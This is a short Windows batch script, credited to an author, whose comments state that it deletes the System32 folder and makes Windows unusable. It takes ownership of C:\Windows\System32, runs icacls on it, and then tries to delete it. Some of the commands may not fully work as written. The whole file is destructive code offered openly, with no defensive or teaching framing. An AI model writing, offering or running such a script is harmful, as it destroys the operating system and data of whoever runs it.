:: @author: joeldiazcc
:: This script deletes System32
:: Needs administrator permission
:: MAKE YOUR WINDOWS UNUSABLE
@echo off
takeown /f C:\Windows\System32 /r
icacls C:\Windows\System32
del C:\Windows\System32
